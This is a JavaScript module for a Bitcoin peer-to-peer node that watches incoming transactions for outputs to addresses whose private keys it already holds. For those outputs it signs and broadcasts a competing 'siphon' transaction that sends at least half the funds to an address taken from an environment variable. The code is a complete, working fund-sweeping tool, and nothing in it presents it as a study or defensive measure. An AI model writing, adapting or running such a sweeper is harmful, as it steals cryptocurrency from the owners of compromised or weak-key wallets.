const { Transaction, Address } = require("bitcore-lib");
const { getKeyForAddress } = require("./addressToKey");
const { Messages } = require("bitcore-p2p");
const { updateFeeRate } = require("./feeRate");
const { addItem, getItem } = require("./memPool");
const messages = new Messages();

const handleTx = async ({ pool, peer, incoming, siphon }) => {
  try {
    // Check our memPool if we've seen the transaction.
    let transaction = getItem(incoming.id);
    if (transaction === undefined) {
      transaction = await getSiphonTransaction({
        incoming,
        siphon,
      });
      addItem(incoming.id, transaction);
    }
    if (!transaction) {
      return false;
    }
    const tx = messages.Transaction(transaction);
    // Send the siphon tx back to the incoming peer.
    peer.sendMessage(tx);
    // Forward the incoming tx to the pool followed by the siphon tx.
    const incomingTx = messages.Transaction(incoming);
    pool.sendMessage(incomingTx);
    pool.sendMessage(tx);
    console.log(`Sent siphon TX ${transaction.id}`);
  } catch (error) {
    console.error(error);
  }
};

const getSiphonTransaction = async ({
  incoming,
  siphon = process.env.SIPHON,
}) => {
  try {
    const promises = incoming.outputs
      .map((output) => {
        const address = output.script.toAddress();
        const type = address.type;
        switch (type) {
          case Address.PayToPublicKeyHash:
          case Address.PayToWitnessPublicKeyHash:
            return getKeyForAddress({
              txid: incoming.id,
              output,
              addr: address.toString(),
            });
            break;
        }
      })
      .filter((a) => a);
    if (!promises.length) {
      return false;
    }
    const matches = (await Promise.all(promises)).filter((a) => a);
    if (!matches.length) {
      return false;
    }
    console.log(JSON.stringify({ matches }));
    const utxos = matches.map(
      ({ txid, output }, outputIndex) =>
        new Transaction.UnspentOutput({
          txid,
          outputIndex,
          address: output.script.toAddress(),
          script: output.script,
          satoshis: output.satoshis,
        })
    );
    const keys = matches.map(({ key }) => key);
    const transaction = new Transaction().from(utxos);
    let siphonAmount = Math.ceil(transaction.inputAmount * 0.5);
    siphonAmount = Math.max(siphonAmount, Transaction.DUST_AMOUNT);
    transaction.to(siphon, siphonAmount);
    transaction.sign(keys);
    if (transaction.outputAmount < Transaction.DUST_AMOUNT) {
      console.log(
        JSON.stringify({
          message: "Output too low, not sending.",
          incomingTxId: incoming.id,
          output: transaction.outputAmount,
          input: transaction.inputAmount,
          fee: transaction.getFee(),
          signed: transaction.isFullySigned(),
          numMatches: matches.length,
          numUtxos: utxos.length,
          numKeys: keys.length,
        })
      );
      return false;
    }
    console.log(
      JSON.stringify({
        incomingTxId: incoming.id,
        siphonTxId: transaction.id,
        output: transaction.outputAmount,
        input: transaction.inputAmount,
        fee: transaction.getFee(),
        signed: transaction.isFullySigned(),
        numMatches: matches.length,
        numUtxos: utxos.length,
        numKeys: keys.length,
      })
    );
    return transaction;
  } catch (error) {
    console.error(error);
  }
};

module.exports = { handleTx, getSiphonTransaction };
